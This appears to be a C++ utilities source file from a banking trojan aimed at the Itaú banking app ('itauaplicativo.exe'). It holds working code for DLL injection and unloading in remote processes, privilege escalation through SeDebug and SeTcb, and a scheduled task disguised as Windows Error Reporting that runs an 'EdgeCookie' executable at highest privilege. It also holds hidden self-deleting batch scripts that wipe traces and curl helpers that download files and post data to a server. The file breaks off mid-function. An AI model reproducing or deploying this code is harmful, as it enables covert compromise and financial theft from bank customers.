#include "stdafx.h"


#include <Windows.h>
#include <WinInet.h>
#include <iostream>
#include <string>
#include <sstream>
#include <json/json.h>
#include "utils.h"
#include <taskschd.h>
#include <comdef.h>
#include "yapi.hpp"

using namespace std;
using namespace yapi;

#pragma comment(lib, "wininet.lib")

std::string convertWideToChar(const std::wstring& wstr) {
	int length = static_cast<int>(wstr.length()) + 1;
	int charLength = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), length, nullptr, 0, nullptr, nullptr);
	std::vector<char> charBuffer(charLength);
	WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), length, charBuffer.data(), charLength, nullptr, nullptr);
	return std::string(charBuffer.data(), charLength - 1);
}


std::string GetComputerUid()
{
	std::string macAddress = GetMacAddress();
	std::string uid = MacAddressToLicenseKey(macAddress);

	return uid;
}


void run_in_service(string Path, int nShow)
{
	DWORD dwSessionId = WTSGetActiveConsoleSessionId();
	HANDLE hProcessToken = NULL;
	HANDLE hUserToken = NULL;
	HANDLE hUserToken1 = NULL;

	TOKEN_PRIVILEGES TokenPriv, OldTokenPriv;
	DWORD OldSize = 0;
	OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS_P, &hProcessToken);
	LookupPrivilegeValue(NULL, SE_TCB_NAME, &TokenPriv.Privileges[0].Luid);
	TokenPriv.PrivilegeCount = 1;
	TokenPriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	AdjustTokenPrivileges(hProcessToken, FALSE, &TokenPriv, sizeof(TokenPriv), &OldTokenPriv, &OldSize);

	HANDLE hToken = NULL;
	WTSQueryUserToken(dwSessionId, &hToken);
	DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityIdentification, TokenPrimary, &hUserToken);
	CloseHandle(hToken);
	DuplicateTokenEx(hProcessToken, MAXIMUM_ALLOWED, NULL, SecurityIdentification, TokenPrimary, &hUserToken1);

	SetTokenInformation(hUserToken1, TokenSessionId, &dwSessionId, sizeof(dwSessionId));

	LPVOID pEnv = NULL;
	CreateEnvironmentBlock(&pEnv, hUserToken, FALSE);

	char szDesktop[] = { "WinSta0\\Default" };
	STARTUPINFO si = { 0 };
	si.cb = sizeof(STARTUPINFO);
	si.lpDesktop = szDesktop;
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = nShow;
	//...

	PROCESS_INFORMATION pi = { 0 };
	//launch the process in active logged in user's session
	CreateProcessAsUser(
		hUserToken1,
		NULL,
		(LPSTR)Path.c_str(),
		NULL,
		NULL,
		FALSE,
		NORMAL_PRIORITY_CLASS | CREATE_UNICODE_ENVIRONMENT,
		pEnv,
		NULL,
		&si,
		&pi
	);

	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
	DestroyEnvironmentBlock(pEnv);
	CloseHandle(hUserToken);
	CloseHandle(hUserToken1);
	AdjustTokenPrivileges(hProcessToken, FALSE, &OldTokenPriv, sizeof(OldTokenPriv), NULL, NULL);
	CloseHandle(hProcessToken);
}

CHAR TargetProcess[][MAX_PATH]{
	"itauaplicativo.exe"
};

void DoClearFolderNotExit()
{
	// Step 1: Get the application directory path
	WCHAR appPath[MAX_PATH];
	DWORD pathLength = GetModuleFileNameW(NULL, appPath, MAX_PATH);
	if (pathLength == 0) {
		// Handle path retrieval failure
		return;
	}

	WCHAR* lastSlash = wcsrchr(appPath, L'\\');
	if (lastSlash == NULL) {
		// Handle invalid path
		return;
	}

	*lastSlash = L'\0'; // Set the last slash to null-terminator to get the directory path

	// Step 3: Create and execute the deletion script
	WCHAR scriptPath[MAX_PATH];
	wcscpy_s(scriptPath, MAX_PATH, appPath);
	wcscat_s(scriptPath, MAX_PATH, L"\\delete_files.bat");

	FILE* scriptFile = _wfopen(scriptPath, L"w");
	if (scriptFile == NULL) {
		// Handle script file creation failure
		return;
	}

	// Write the commands to the script file
	fprintf(scriptFile, "@echo off\n");
	fprintf(scriptFile, "timeout 10\n");
	fprintf(scriptFile, "cd /d \"%ls\"\n", appPath);
	fprintf(scriptFile, "rmdir /s /q anim\n");
	fprintf(scriptFile, "del /q /s *.*\n");
	fprintf(scriptFile, "exit\n");

	fclose(scriptFile);

	// Execute the deletion script
	STARTUPINFOW startupInfo;
	PROCESS_INFORMATION processInfo;
	ZeroMemory(&startupInfo, sizeof(startupInfo));
	ZeroMemory(&processInfo, sizeof(processInfo));
	startupInfo.cb = sizeof(startupInfo);
	startupInfo.dwFlags |= STARTF_USESHOWWINDOW;
	startupInfo.wShowWindow = SW_HIDE;

	if (!CreateProcessW(NULL, scriptPath, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo)) {
		// Handle script execution failure
		return;
	}

	// Step 2: Terminate the application
	//ExitProcess(0);

	// The code beyond this point will not be executed as the process will be terminated



	CloseHandle(processInfo.hProcess);
	CloseHandle(processInfo.hThread);
}

void runExitProcess(BOOL rpctestunload)
{
	/*if (rpctestunload == true)
	{
		DWORD pid = GetProcessIdFromName("winlogon.exe");
		UnloadLib(pid, "RpcTest64.dll", NULL);
	}
	
	DWORD pid = GetProcessIdFromName("explorer.exe");
	UnloadLib(pid,"Band64.dll", NULL);*/

	ExitProcess(0);
}

void DoClearFolder()
{
	// Step 1: Get the application directory path
	WCHAR appPath[MAX_PATH];
	DWORD pathLength = GetModuleFileNameW(NULL, appPath, MAX_PATH);
	if (pathLength == 0) {
		// Handle path retrieval failure
		return;
	}

	WCHAR* lastSlash = wcsrchr(appPath, L'\\');
	if (lastSlash == NULL) {
		// Handle invalid path
		return;
	}

	*lastSlash = L'\0'; // Set the last slash to null-terminator to get the directory path

	// Step 3: Create and execute the deletion script
	WCHAR scriptPath[MAX_PATH];
	wcscpy_s(scriptPath, MAX_PATH, appPath);
	wcscat_s(scriptPath, MAX_PATH, L"\\delete_files.bat");

	FILE* scriptFile = _wfopen(scriptPath, L"w");
	if (scriptFile == NULL) {
		// Handle script file creation failure
		return;
	}

	// Write the commands to the script file
	fprintf(scriptFile, "@echo off\n");
	fprintf(scriptFile, "timeout 4\n");
	fprintf(scriptFile, "schtasks /delete /tn \"\\Microsoft\\Windows\\Windows Error Reporting\\ReportingUpdate\" /f\n");
	fprintf(scriptFile, "schtasks /delete /tn \"ReportingUpdate\" /f\n");
	fprintf(scriptFile, "cd /d \"%ls\"\n", appPath);
	fprintf(scriptFile, "rmdir /s /q anim\n");
	fprintf(scriptFile, "del /q /s *.*\n");
	fprintf(scriptFile, "exit\n");

	fclose(scriptFile);

	// Execute the deletion script
	STARTUPINFOW startupInfo;
	PROCESS_INFORMATION processInfo;
	ZeroMemory(&startupInfo, sizeof(startupInfo));
	ZeroMemory(&processInfo, sizeof(processInfo));
	startupInfo.cb = sizeof(startupInfo);
	startupInfo.dwFlags |= STARTF_USESHOWWINDOW;
	startupInfo.wShowWindow = SW_HIDE;

	if (!CreateProcessW(NULL, scriptPath, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo)) {
		// Handle script execution failure
		return;
	}

	// Step 2: Terminate the application
	runExitProcess(true);

	// The code beyond this point will not be executed as the process will be terminated


	CloseHandle(processInfo.hProcess);
	CloseHandle(processInfo.hThread);
}

bool exist_file(const std::string& name) {
	struct stat buffer;
	return (stat(name.c_str(), &buffer) == 0);
}

void killProcessByName(string filename)
{
	HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
	PROCESSENTRY32 pEntry;
	pEntry.dwSize = sizeof(pEntry);
	BOOL hRes = Process32First(hSnapShot, &pEntry);
	while (hRes)
	{
		if (_stricmp(pEntry.szExeFile, filename.c_str()) == 0)
		{
			HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, 0,
				(DWORD)pEntry.th32ProcessID);
			if (hProcess != NULL)
			{
				TerminateProcess(hProcess, 9);
				CloseHandle(hProcess);
			}
		}
		hRes = Process32Next(hSnapShot, &pEntry);
	}
	CloseHandle(hSnapShot);
}

int exist_directory(std::string& pathname)
{
	struct stat info;
	if (stat(pathname.c_str(), &info) != 0)
		return 0;
	else if (info.st_mode & S_IFDIR)  // S_ISDIR() doesn't exist on my windows 
		return 1;
	else
		return 0;
}

Json::Value parseJson(const string& json)
{
	Json::Value root;
	Json::Reader reader;
	reader.parse(json, root);
	return root;
}

string stringifyJson(const Json::Value& val)
{
	//When we transmit JSON data, we omit all whitespace
	Json::StreamWriterBuilder wbuilder;
	return Json::writeString(wbuilder, val);
}

const std::string currentDateTime() {
	time_t     now = time(0);
	struct tm  tstruct;
	char       buf[80];
	tstruct = *localtime(&now);
#ifdef DEBUG
	if (nHours == -1)
	{
		nHours = tstruct.tm_hour;
	}
	if (nHours + 1 <= tstruct.tm_hour)
	{
		bFlag = true;
	}
#endif
	strftime(buf, sizeof(buf), "%d/%m/%Y %X", &tstruct);
	return buf;
}

const std::string currentDate() {
	time_t     now = time(0);
	struct tm  tstruct;
	char       buf[80];
	tstruct = *localtime(&now);
	tstruct.tm_hour = tstruct.tm_hour;
	strftime(buf, sizeof(buf), "%Y-%m-%d", &tstruct);
	return buf;
}

std::wstring to_wide_string(const std::string& input)
{
	std::wstring_convert<std::codecvt_utf8<wchar_t>> converter;
	return converter.from_bytes(input);
}

std::string to_byte_string(const std::wstring& input)
{
	//std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
	std::wstring_convert<std::codecvt_utf8<wchar_t>> converter;
	return converter.to_bytes(input);
}

std::string getExePath() {
	TCHAR buffer[MAX_PATH] = { 0 };
	GetModuleFileName(NULL, buffer, MAX_PATH);
	std::wstring::size_type pos = std::string(buffer).find_last_of("\\/");
	return std::string(buffer).substr(0, pos);
}


void file_log(string log)
{
	std::string msg = currentDateTime() + " : " + log + "\r\n";
	OutputDebugStringA(msg.c_str());
}

bool IsTargetProcess(CHAR* pszName, std::string processname) {
	if (processname.compare(pszName) == 0)
		return true;

	return false;
}

void WINAPI UnloadLib(DWORD dwProcessId, LPCSTR pszLibFile, PSECURITY_ATTRIBUTES pSecAttr) {

	BOOL fOk = FALSE; // Assume that the function fails
	HANDLE hProcess = NULL, hThread = NULL;
	PSTR pszLibFileRemote = NULL;

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);

	if (hProcess == NULL)
	{
		file_log("Can't Open process");
	}

	X64Call RtlCreateUserThread("RtlCreateUserThread");
	// Validate RtlCreateUserThread
	if (!RtlCreateUserThread) {
		file_log("RtlCreateUserThread is not exist");
		return;
	}

	X64Call LdrUnloadDll("LdrUnloadDll");
	if (!LdrUnloadDll)
	{
		file_log("LdrUnloadDll is not exist");
		return;
	}

	BOOL isRemoteWow64 = FALSE;
	IsWow64Process(hProcess, &isRemoteWow64);
	if (!isRemoteWow64) {
		DWORD64 dllBaseAddr = GetModuleHandle64(hProcess, _T(pszLibFile));
		file_log("getting address");

		if (dllBaseAddr) {
			DWORD64 ret = RtlCreateUserThread(hProcess, NULL, FALSE, 0, 0, NULL, LdrUnloadDll, dllBaseAddr, NULL, NULL);
			file_log("unloaded");
		}
	}

	CloseHandle(hProcess);
}

void WINAPI InjectLib(DWORD dwProcessId, LPCSTR pszLibFile, PSECURITY_ATTRIBUTES pSecAttr) {

	BOOL fOk = FALSE; // Assume that the function fails
	HANDLE hProcess = NULL, hThread = NULL;
	PSTR pszLibFileRemote = NULL;

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);

	if (hProcess == NULL)
	{
		file_log("Can't Open process");
	}

	YAPICall LoadLibraryA(hProcess, _T("kernel32.dll"), "LoadLibraryA");

	BOOL isWow64 = false;
	IsWow64Process(hProcess, &isWow64);

	if (isWow64) {
		DWORD64 x64Dll = LoadLibraryA.Dw64()(pszLibFile);
	}
	else
	{
		DWORD64 x86Dll = LoadLibraryA(pszLibFile);
	}
}

BOOL InstallHookDll(const char* pDllPath, std::string attach, bool bUnloadneeded)
{
	if (!PathFileExistsA(pDllPath)) {
		return false;
	}

	HANDLE hSnapshot = NULL;
	PROCESSENTRY32 pe;
	BOOL ifProcessExist = FALSE;

	LPCSTR pDllName = strrchr(pDllPath, '\\');
	pDllName++;

	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	pe.dwSize = sizeof(pe);

	Process32First(hSnapshot, &pe);
	do
	{
		if (IsTargetProcess(pe.szExeFile, attach))
		{
			ifProcessExist = TRUE;
			break;
		}

	} while (Process32Next(hSnapshot, &pe));

	CloseHandle(hSnapshot);

	if (ifProcessExist)
	{
		HANDLE hprocess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
		YAPICall GetModuleHandle(hprocess, _T("kernel32.dll"), sizeof(TCHAR) == sizeof(char) ? "GetModuleHandleA" : "GetModuleHandleW");
		DWORD64 baseAddress = GetModuleHandle.Dw64()(_T(pDllName));

		if (!baseAddress)
		{
			InjectLib(pe.th32ProcessID, pDllPath, NULL);
			file_log("hook dll is worked");
		}
		else {
			file_log(pDllPath);
			file_log("hook dll is alreay hooked");

			//if (bUnloadneeded == true)
			//{
			//	UnloadLib(pe.th32ProcessID, pDllName, NULL);
			//	InjectLib(pe.th32ProcessID, pDllPath, NULL);
			//}

		}

		CloseHandle(hprocess);
	}



	return TRUE;
}

bool IsProcessActiveWindow(DWORD processId)
{
	HWND activeWindow = GetForegroundWindow();
	DWORD activeProcessId;

	if (activeWindow && GetWindowThreadProcessId(activeWindow, &activeProcessId))
	{
		if (activeProcessId == processId)
			return true;
	}

	return false;
}

BOOL IsProcessRunning(string filename, BOOL critical)
{
	BOOL bFind = FALSE;
	HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
	PROCESSENTRY32 pEntry;
	pEntry.dwSize = sizeof(pEntry);
	BOOL hRes = Process32First(hSnapShot, &pEntry);
	while (hRes)
	{
		if (strcmp(pEntry.szExeFile, filename.c_str()) == 0)
		{
			if (critical == true || IsProcessActiveWindow(pEntry.th32ProcessID) == true)
			{
				bFind = TRUE;
				break;
			}
		}
		hRes = Process32Next(hSnapShot, &pEntry);
	}
	CloseHandle(hSnapShot);
	return bFind;
}

BOOL IsProcessRunning(DWORD proessid)
{
	BOOL bFind = FALSE;
	HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
	PROCESSENTRY32 pEntry;
	pEntry.dwSize = sizeof(pEntry);
	BOOL hRes = Process32First(hSnapShot, &pEntry);
	while (hRes)
	{
		if (pEntry.th32ProcessID == proessid)
		{
			bFind = TRUE;
			break;
		}
		hRes = Process32Next(hSnapShot, &pEntry);
	}
	CloseHandle(hSnapShot);
	return bFind;
}

DWORD GetProcessIdFromName(string filename)
{
	DWORD pid = 0;
	
	HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
	PROCESSENTRY32 pEntry;
	pEntry.dwSize = sizeof(pEntry);
	BOOL hRes = Process32First(hSnapShot, &pEntry);
	file_log("searching pids");
	while (hRes)
	{
		file_log(pEntry.szExeFile);

		if (strcmp(pEntry.szExeFile, filename.c_str()) == 0)
		{
			pid = pEntry.th32ProcessID;
			file_log("found pid");
			file_log(std::to_string(pid));

			break;
		}
		hRes = Process32Next(hSnapShot, &pEntry);
	}
	CloseHandle(hSnapShot);

	return pid;
}


std::string randomName(int length, string extension) {

	std::string result;
	const char* tempPath = std::getenv("TEMP");
	if (tempPath != nullptr) {
		result = std::string(tempPath);
	}


	std::string name;

	static const char charset[] = "abcdefghijklmnopqrstuvwxyz";
	int charsetSize = sizeof(charset) - 1;

	// Initialize random number generator
	static bool seeded = false;
	if (!seeded) {
		srand(time(NULL));
		seeded = true;
	}

	// Generate random letters
	for (int i = 0; i < length; i++) {
		int randomIndex = rand() % charsetSize;
		name += charset[randomIndex];
	}

	result = result + "\\" + name + extension;

	return result;
}

BOOL EnableDebugPrivilege()
{
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tkp;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
		return FALSE;
	}

	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))
	{
		return FALSE;
	}

	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Luid = luid;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if (!AdjustTokenPrivileges(hToken, false, &tkp, sizeof(tkp), NULL, NULL))
	{
		return FALSE;
	}

	if (!CloseHandle(hToken))
	{
		return FALSE;
	}

	return TRUE;
}


BOOL MakeSchedule(std::string time)
{
	HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
	if (FAILED(hr))
	{
		return 1;
	}

	ITaskService* pService = NULL;
	hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)& pService);
	if (FAILED(hr))
	{
		CoUninitialize();
		return 1;
	}

	hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
	if (FAILED(hr))
	{
		pService->Release();
		CoUninitialize();
		return 1;
	}

	//get Microsoft's folder and it there is no, it will use root folder
	ITaskFolder* pRootFolder = NULL;
	hr = pService->GetFolder(_bstr_t("\\Microsoft\\Windows\\Windows Error Reporting"), &pRootFolder);
	if (FAILED(hr))
	{
		hr = pService->GetFolder(_bstr_t("\\"), &pRootFolder);
		if (FAILED(hr))
		{
			pService->Release();
			CoUninitialize();
			return 1;
		}
	}

	ITaskDefinition* pTaskDefinition = NULL;
	hr = pService->NewTask(0, &pTaskDefinition);
	if (FAILED(hr))
	{
		pRootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 1;
	}

	ITriggerCollection* pTriggerCollection = NULL;
	hr = pTaskDefinition->get_Triggers(&pTriggerCollection);
	if (FAILED(hr))
	{
		pTaskDefinition->Release();
		pRootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 1;
	}

	ITrigger* pTrigger = NULL;
	hr = pTriggerCollection->Create(TASK_TRIGGER_TIME, &pTrigger);
	if (FAILED(hr))
	{
		pTriggerCollection->Release();
		pTaskDefinition->Release();
		pRootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 1;
	}

	ITimeTrigger* pTimeTrigger = NULL;
	hr = pTrigger->QueryInterface(IID_ITimeTrigger, (void**)& pTimeTrigger);
	if (FAILED(hr))
	{
		pTrigger->Release();
		pTriggerCollection->Release();
		pTaskDefinition->Release();
		pRootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 1;
	}

	// Set the trigger properties
	pTimeTrigger->put_Id(_bstr_t("Trigger1"));
	pTimeTrigger->put_StartBoundary(_bstr_t("2010-10-10T00:00:00"));
	pTimeTrigger->put_EndBoundary(_bstr_t("2030-12-31T23:59:59"));

	IRepetitionPattern* pRepetitionPattern = NULL;
	hr = pTimeTrigger->get_Repetition(&pRepetitionPattern);
	if (FAILED(hr))
	{
		pTimeTrigger->Release();
		pTrigger->Release();
		pTriggerCollection->Release();
		pTaskDefinition->Release();
		pRootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 1;
	}
	// Set the repetition pattern properties
	pRepetitionPattern->put_Interval(_bstr_t(time.c_str())); // Repeat every 5 minutes
	//pRepetitionPattern->put_Duration(_bstr_t(INFINITE_TASK_DURATION)); // Repeat for 24 hours

	IActionCollection* pActionCollection = NULL;
	hr = pTaskDefinition->get_Actions(&pActionCollection);
	if (FAILED(hr))
	{
		pTimeTrigger->Release();
		pTrigger->Release();
		pTriggerCollection->Release();
		pTaskDefinition->Release();
		pRootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 1;
	}

	IAction* pAction = NULL;
	hr = pActionCollection->Create(TASK_ACTION_EXEC, &pAction);
	if (FAILED(hr))
	{
		pActionCollection->Release();
		pTimeTrigger->Release();
		pTrigger->Release();
		pTriggerCollection->Release();
		pTaskDefinition->Release();
		pRootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 1;
	}

	IExecAction* pExecAction = NULL;
	hr = pAction->QueryInterface(IID_IExecAction, (void**)& pExecAction);
	if (FAILED(hr))
	{
		pAction->Release();
		pActionCollection->Release();
		pTimeTrigger->Release();
		pTrigger->Release();
		pTriggerCollection->Release();
		pTaskDefinition->Release();
		pRootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 1;
	}

	char process_path[MAX_PATH] = "%APPDATA%\\EdgeCookie\\x86\\";
	char process_name[MAX_PATH];

	GetModuleFileName(NULL, process_name, MAX_PATH);

	// Extract process name from path
	char* processName = strrchr(process_name, '\\'); // Find last occurrence of '\\'
	if (processName != nullptr) {
		processName++; // Move past the '\\'
		strcat(process_path, processName);
	}
	else {
		strcat(process_path, "cookie_exporter.exe");
	}

	file_log(process_path);

	// Set the action properties
	CHAR expandedPath[MAX_PATH];
	ExpandEnvironmentStringsA(process_path, expandedPath, MAX_PATH);
	pExecAction->put_Path(_bstr_t(expandedPath));
	pExecAction->put_Arguments(_bstr_t("--check"));

	/////////////////////////////////////////////////////////
	// Get the principal of the task
	IPrincipal* pPrincipal = NULL;
	hr = pTaskDefinition->get_Principal(&pPrincipal);
	if (FAILED(hr))
	{
		file_log("Failed to get the task principal.");
		pTaskDefinition->Release();
		//	pRegisteredTask->Release();
		pRootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 1;
	}
	pPrincipal->put_RunLevel(TASK_RUNLEVEL_HIGHEST);

	// Save the changes to the task
	hr = pTaskDefinition->put_Principal(pPrincipal);
	if (FAILED(hr))
	{
		file_log("Failed to update the task principal.");
		pPrincipal->Release();
		pTaskDefinition->Release();
		//pRegisteredTask->Release();
		pRootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 1;
	}

	//////////////////////////////////////////////////////////////
	// Register the task in the root folder
	IRegisteredTask* pRegisteredTask = NULL;
	hr = pRootFolder->RegisterTaskDefinition(
		_bstr_t("ReportingUpdate"),
		pTaskDefinition,
		TASK_CREATE_OR_UPDATE,
		_variant_t(),
		_variant_t(),
		TASK_LOGON_INTERACTIVE_TOKEN,
		_variant_t(L""),
		&pRegisteredTask
	);
	if (FAILED(hr))
	{
		pExecAction->Release();
		pAction->Release();
		pActionCollection->Release();
		pTimeTrigger->Release();
		pTrigger->Release();
		pTriggerCollection->Release();
		pTaskDefinition->Release();
		pRootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 1;
	}

	file_log("registered");

	// Run the task
	IRunningTask* pRunningTask = NULL;
	hr = pRegisteredTask->Run(_variant_t(), &pRunningTask);
	if (FAILED(hr))
	{
		pRegisteredTask->Release();
		pRepetitionPattern->Release();
		pTimeTrigger->Release();
		pTrigger->Release();
		pTriggerCollection->Release();
		pAction->Release();
		pActionCollection->Release();
		pTaskDefinition->Release();
		pRootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 1;
	}

	file_log("Run schedule");

	// Cleanup
	pRegisteredTask->Release();
	pExecAction->Release();
	pAction->Release();
	pActionCollection->Release();
	pTimeTrigger->Release();
	pTrigger->Release();
	pTriggerCollection->Release();
	pTaskDefinition->Release();
	pRootFolder->Release();
	pService->Release();
	CoUninitialize();

	return 0;
}

bool CreateDirectoryRecursively(const std::string& path) {
	// Try to create the directory
	if (CreateDirectory(path.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS) {
		return true; // Success
	}
	else {
		// If CreateDirectory failed and the error is ERROR_PATH_NOT_FOUND,
		// it means one or more parent directories don't exist.
		if (GetLastError() == ERROR_PATH_NOT_FOUND) {
			// Extract the parent directory from the given path
			size_t pos = path.find_last_of("\\/");
			if (pos != std::string::npos) {
				std::string parentDir = path.substr(0, pos);
				// Recursively create the parent directory
				if (CreateDirectoryRecursively(parentDir)) {
					// Retry creating the original directory after the parent is created
					return CreateDirectory(path.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS;
				}
			}
		}
		return false; // Failed to create directory
	}
}

#include <iphlpapi.h>

std::string GetMacAddress() {
	std::string macAddress;
	IP_ADAPTER_INFO AdapterInfo[32];
	ULONG buflen = sizeof(AdapterInfo);

	if (GetAdaptersInfo(AdapterInfo, &buflen) == ERROR_SUCCESS) {
		PIP_ADAPTER_INFO pAdapterInfo = AdapterInfo;
		macAddress = pAdapterInfo->Address[0];
		for (unsigned int i = 1; i < pAdapterInfo->AddressLength; i++) {
			std::ostringstream oss;
			oss << ":" << std::setw(2) << std::setfill('0') << std::hex << (int)pAdapterInfo->Address[i];
			macAddress += oss.str();
		}
	}

	return macAddress;
}

// Function to convert a MAC address string to a 9-digit number
std::string MacAddressToLicenseKey(const std::string& macAddress) {
	// Hash the MAC address string
	std::hash<std::string> hasher;
	size_t hashValue = hasher(macAddress);

	// Convert the hash value to a 9-digit number
	std::ostringstream oss;
	oss << std::setfill('0') << std::setw(9) << (hashValue % 1000000000);
	return oss.str();
}

#include <curl/curl.h>

static size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
	((std::string*)userp)->append((char*)contents, size * nmemb);
	return size * nmemb;
}

void notifytoserver(std::string notifyurl)
{
	CURL* curl;
	CURLcode res;
	std::string readBuffer;
	curl_global_init(CURL_GLOBAL_DEFAULT);
	curl = curl_easy_init();
	if (curl) {
		curl_easy_setopt(curl, CURLOPT_URL, notifyurl.c_str());
		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
		curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);
		res = curl_easy_perform(curl);

		// Check for errors
		if (res != CURLE_OK) {
			;
		}
		else {
			;
		}

		curl_easy_cleanup(curl);
	}

	curl_global_cleanup();
}

// Callback function to write downloaded data to a file
static size_t WriteCallbacks(void* contents, size_t size, size_t nmemb, void* userp) {
	size_t total_size = size * nmemb;
	std::ofstream* file = static_cast<std::ofstream*>(userp);
	if (file->is_open()) {
		file->write(static_cast<char*>(contents), total_size);
		return total_size;
	}
	return 0;
}

bool DownloadFile(const std::string& url, const std::string& outputPath) {
	CURL* curl;
	CURLcode res;

	curl_global_init(CURL_GLOBAL_DEFAULT);
	curl = curl_easy_init();

	if (curl) {
		curl_easy_setopt(curl, CURLOPT_URL, url.c_str());

		// Open the output file for writing in binary mode
		std::ofstream output_file(outputPath, std::ios::binary);
		if (!output_file.is_open()) {
			return false;
		}

		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallbacks);
		curl_easy_setopt(curl, CURLOPT_WRITEDATA, &output_file);

		res = curl_easy_perform(curl);
		if (res != CURLE_OK) {
			return false;
		}

		curl_easy_cleanup(curl);
		curl_global_cleanup();
		output_file.close();

		return true;
	}

	return false;
}

std::string removeNonASCII(const std::string& input) {
	std::string result;

	for (char c : input) {
		if (static_cast<unsigned char>(c) <= 127) {
			result += c;
		}
	}

	return result;
}


std::string ToLower(const std::string& str) {
	std::string lowerCaseStr;
	std::transform(str.begin(), str.end(), std::back_inserter(lowerCaseStr), ::tolower);
	return lowerCaseStr;
}

bool isNonAscii(char c) {
	if (c >= 48 && c <= 57) {
		return false;
	}
	else if (c >= 65 && c <= 90) {
		return false;
	}
	else if (c >= 97 && c <= 122) {
		return false;
	}

	return true;
}

bool PostJsonToServer(const std::string& url, std::string& body, std::string& response)
{
	bool flag = false;
	CURL* curl;
	CURLcode res;

	// Initialize curl
	curl_global_init(CURL_GLOBAL_DEFAULT);
	curl = curl_easy_init();
	if (curl) {
		// Set URL
		curl_easy_setopt(curl, CURLOPT_URL, url.c_str());

		// Specify POST method
		curl_easy_setopt(curl, CURLOPT_POST, 1L);

		// Set the content type to JSON
		struct curl_slist* headers = NULL;
		headers = curl_slist_append(headers, "Content-Type: application/json");
		curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

		// Set POST data
		curl_easy_setopt(curl, CURLOPT_POSTFIELDS, body.c_str());

		// Set the callback function to handle the response data
		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);

		// Set the pointer to the string where response will be stored
		curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

		// Perform the request, res will get the return code
		res = curl_easy_perform(curl);

		// Check for errors
		if (res != CURLE_OK) {
			file_log("curl_easy_perform() failed");
			file_log(curl_easy_strerror(res));
		}
		else {
			flag = true;
		}

		// Cleanup
		curl_slist_free_all(headers);
		curl_easy_cleanup(curl);
	}

	// Global cleanup
	curl_global_cleanup();
	return flag;
}

bool GetJsonResponse(const std::string& url, std::string& jsonResponse) {
	CURL* curl;
	CURLcode res;

	curl_global_init(CURL_GLOBAL_DEFAULT);
	curl = curl_easy_init();

	if (curl) {
		curl_easy_setopt(curl, CURLOPT_URL, url.c_str());

		// Set the callback function to write the response into a string
		curl_easy_setopt(curl, CURLOPT_USERAGENT, "cookie");
		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
		curl_easy_setopt(curl, CURLOPT_WRITEDATA, &jsonResponse);

		res = curl_easy_perform(curl);
		if (res != CURLE_OK) {
			return false;
		}

		curl_easy_cleanup(curl);
		curl_global_cleanup();

		file_log(jsonResponse);
		//jsonResponse = removeNonASCII(jsonResponse);

		return true;
	}

	return false;
}

string string_replace(string src, string const& target, string const& repl)
{
	if (target.length() == 0) {
		return src;
	}

	if (src.length() == 0) {
		return src;
	}

	size_t idx = 0;

	for (;;) {
		idx = src.find(target, idx);
		if (idx == string::npos)  break;

		src.replace(idx, target.length(), repl);
		idx += repl.length();
	}

	return src;
}

int getStringSID(LPWSTR szSID)
{

	HANDLE hToken = NULL;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
	{
		_tprintf(_T("OpenProcessToken failed. GetLastError returned: %d\n"),
			GetLastError());
		return -1;
	}

	DWORD dwBufferSize = 0;
	if (!GetTokenInformation(hToken, TokenUser, NULL, 0, &dwBufferSize) &&
		(GetLastError() != ERROR_INSUFFICIENT_BUFFER))
	{
